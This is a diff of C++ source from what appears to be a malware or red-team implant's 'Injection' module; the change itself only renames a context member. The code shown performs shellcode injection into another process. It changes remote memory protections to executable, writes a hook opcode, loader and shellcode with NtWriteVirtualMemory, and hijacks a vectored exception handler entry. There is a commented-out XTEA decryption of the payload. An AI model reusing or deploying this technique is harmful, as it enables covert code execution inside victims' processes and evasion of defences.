@@ -28,27 +28,27 @@ namespace Injection {
         x_memcpy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void**, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(void*, writer.opcode->data), 0x5, &write)) || write != 0x5) {
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(void*, writer.opcode->data), 0x5, &write)) || write != 0x5) {
             return_defer(ntstatus);
         }
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void** , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write)) || write != writer.loader->length) {
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void** , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write)) || write != writer.loader->length) {
             return_defer(ntstatus);
         }
 
         //Xtea::XteaCrypt(R_CAST(PBYTE, shellcode), n_shellcode, Ctx->Config.Key, FALSE);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void**, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
+            !NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(process, R_CAST(void**, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
             return_defer(ntstatus);
         }
 
         defer:
         if (process) {
-            Ctx->Nt.NtClose(process);
+            Ctx->nt.NtClose(process);
         }
     }
 
@@ -78,7 +78,7 @@ namespace Injection {
 
     defer:
         if (ntstatus != ERROR_SUCCESS) {
-            Ctx->Nt.RtlFreeHeap(Ctx->heap, 0, object);
+            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, object);
         }
     }
 
@@ -98,7 +98,7 @@ namespace Injection {
             match += 0xD;
             handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t * , match + (match + 0x3) + 0x7));
 
-            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->first), &handler, sizeof(void *), nullptr))) {
+            if (!NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void*, handlers->first), &handler, sizeof(void *), nullptr))) {
                 handler = 0;
                 return_defer(ntstatus);
             }
@@ -138,7 +138,7 @@ namespace Injection {
                 return FALSE;
             }
 
-            return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
+            return Ctx->nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
         }
 
     }
